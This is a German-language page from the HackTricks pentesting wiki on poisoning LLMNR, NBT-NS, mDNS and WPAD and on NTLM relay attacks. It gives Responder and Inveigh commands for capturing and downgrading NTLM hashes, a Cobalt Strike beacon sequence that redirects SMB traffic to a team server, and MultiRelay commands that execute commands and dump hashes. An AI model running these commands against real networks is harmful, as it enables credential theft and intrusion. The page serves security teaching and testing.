# Spoofing LLMNR, NBT-NS, mDNS/DNS und WPAD sowie Relay-Angriffe

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## Netzwerkprotokolle

### Protokolle zur lokalen Hostaufl√∂sung
- **LLMNR, NBT-NS und mDNS**:
- Microsoft und andere Betriebssysteme verwenden LLMNR und NBT-NS zur lokalen Namensaufl√∂sung, wenn DNS fehlschl√§gt. Ebenso verwenden Apple- und Linux-Systeme mDNS.
- Diese Protokolle sind aufgrund ihrer unauthentifizierten, broadcastbasierten Natur √ºber UDP anf√§llig f√ºr Abfangen und Spoofing.
- [Responder](https://github.com/lgandx/Responder) kann verwendet werden, um Dienste zu imitieren, indem gef√§lschte Antworten an Hosts gesendet werden, die diese Protokolle abfragen.
- Weitere Informationen zur Dienstimplementierung mit Responder finden Sie [hier](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)
- WPAD erm√∂glicht es Browsern, Proxy-Einstellungen automatisch zu entdecken.
- Die Entdeckung erfolgt √ºber DHCP, DNS oder R√ºckgriff auf LLMNR und NBT-NS, wenn DNS fehlschl√§gt.
- Responder kann WPAD-Angriffe automatisieren und Clients auf b√∂sartige WPAD-Server umleiten.

### Responder f√ºr Protocol Poisoning
- **Responder** ist ein Tool zum Vergiften von LLMNR-, NBT-NS- und mDNS-Abfragen, das selektiv auf Abfragetypen antwortet und haupts√§chlich auf SMB-Dienste abzielt.
- Es ist in Kali Linux vorinstalliert und kann unter `/etc/responder/Responder.conf` konfiguriert werden.
- Responder zeigt erfasste Hashes auf dem Bildschirm an und speichert sie im Verzeichnis `/usr/share/responder/logs`.
- Es unterst√ºtzt sowohl IPv4 als auch IPv6.
- Die Windows-Version von Responder ist [hier](https://github.com/lgandx/Responder-Windows) verf√ºgbar.

#### Ausf√ºhren von Responder
- Um Responder mit den Standard-Einstellungen auszuf√ºhren: `responder -I <Schnittstelle>`
- F√ºr aggressiveres Sondieren (mit potenziellen Nebenwirkungen): `responder -I <Schnittstelle> -P -r -v`
- Techniken zum Erfassen von NTLMv1-Herausforderungen/-Antworten f√ºr einfachere Knackvorg√§nge: `responder -I <Schnittstelle> --lm --disable-ess`
- WPAD-Imitation kann aktiviert werden mit: `responder -I <Schnittstelle> --wpad`
- NetBIOS-Anfragen k√∂nnen auf die IP des Angreifers aufgel√∂st und ein Authentifizierungsproxy eingerichtet werden: `responder.py -I <Schnittstelle> -Pv`

### DHCP-Vergiftung mit Responder
- Das Spoofen von DHCP-Antworten kann die Routing-Informationen eines Opfers dauerhaft vergiften und bietet eine unauff√§lligere Alternative zur ARP-Vergiftung.
- Es erfordert genaue Kenntnisse der Konfiguration des Zielnetzwerks.
- Ausf√ºhren des Angriffs: `./Responder.py -I eth0 -Pdv`
- Diese Methode kann NTLMv1/2-Hashes effektiv erfassen, erfordert jedoch eine sorgf√§ltige Handhabung, um Netzwerkst√∂rungen zu vermeiden.

### Erfassen von Anmeldeinformationen mit Responder
- Responder wird Dienste unter Verwendung der oben genannten Protokolle imitieren und Anmeldeinformationen (in der Regel NTLMv2 Challenge/Response) erfassen, wenn ein Benutzer versucht, sich gegen√ºber den gef√§lschten Diensten zu authentifizieren.
- Es k√∂nnen Versuche unternommen werden, auf NetNTLMv1 herabzustufen oder ESS zu deaktivieren, um das Knacken von Anmeldeinformationen zu erleichtern.

Es ist wichtig zu beachten, dass der Einsatz dieser Techniken legal und ethisch erfolgen sollte, unter Beachtung einer ordnungsgem√§√üen Autorisierung und Vermeidung von St√∂rungen oder unbefugtem Zugriff.

## Inveigh

Inveigh ist ein Tool f√ºr Penetrationstester und Red Teamer, das f√ºr Windows-Systeme entwickelt wurde. Es bietet √§hnliche Funktionen wie Responder und f√ºhrt Spoofing- und Man-in-the-Middle-Angriffe durch. Das Tool hat sich von einem PowerShell-Skript zu einer C#-Bin√§rdatei weiterentwickelt, mit [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) und [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) als Hauptversionen. Detaillierte Parameter und Anweisungen finden Sie im [**Wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh kann √ºber PowerShell ausgef√ºhrt werden:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Oder als eine C#-Bin√§rdatei ausgef√ºhrt:
```bash
Inveigh.exe
```
### NTLM Relay Angriff

Dieser Angriff nutzt SMB-Authentifizierungssitzungen, um auf eine Zielmaschine zuzugreifen und bei Erfolg eine Systemshell zu erhalten. Wichtige Voraussetzungen sind:
- Der authentifizierende Benutzer muss √ºber lokale Administratorrechte auf dem weitergeleiteten Host verf√ºgen.
- SMB-Signierung sollte deaktiviert sein.

#### 445 Portweiterleitung und Tunneling

In Szenarien, in denen eine direkte Netzwerkeinf√ºhrung nicht m√∂glich ist, muss der Datenverkehr auf Port 445 weitergeleitet und getunnelt werden. Tools wie [**PortBender**](https://github.com/praetorian-inc/PortBender) helfen dabei, den Port 445-Verkehr auf einen anderen Port umzuleiten, was wichtig ist, wenn der lokale Administratorzugriff zum Laden von Treibern verf√ºgbar ist.

PortBender-Setup und -Betrieb in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Andere Tools f√ºr den NTLM Relay Angriff

- **Metasploit**: Eingerichtet mit Proxies, lokalen und entfernten Host-Details.
- **smbrelayx**: Ein Python-Skript zum Weiterleiten von SMB-Sitzungen und Ausf√ºhren von Befehlen oder Bereitstellen von Hintert√ºren.
- **MultiRelay**: Ein Tool aus der Responder-Suite zum Weiterleiten bestimmter Benutzer oder aller Benutzer, Ausf√ºhren von Befehlen oder Dumpen von Hashes.

Jedes Tool kann so konfiguriert werden, dass es √ºber einen SOCKS-Proxy arbeitet, falls erforderlich, um Angriffe auch bei indirektem Netzwerkzugriff zu erm√∂glichen.

### MultiRelay-Betrieb

MultiRelay wird aus dem Verzeichnis _**/usr/share/responder/tools**_ ausgef√ºhrt und zielt auf bestimmte IPs oder Benutzer ab.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Diese Tools und Techniken bilden einen umfassenden Satz f√ºr die Durchf√ºhrung von NTLM Relay-Angriffen in verschiedenen Netzwerkumgebungen.

### Erzwingen von NTLM-Anmeldungen

Unter Windows **k√∂nnen Sie m√∂glicherweise einige privilegierte Konten zwingen, sich bei beliebigen Maschinen anzumelden**. Lesen Sie die folgende Seite, um zu erfahren, wie:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Referenzen
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
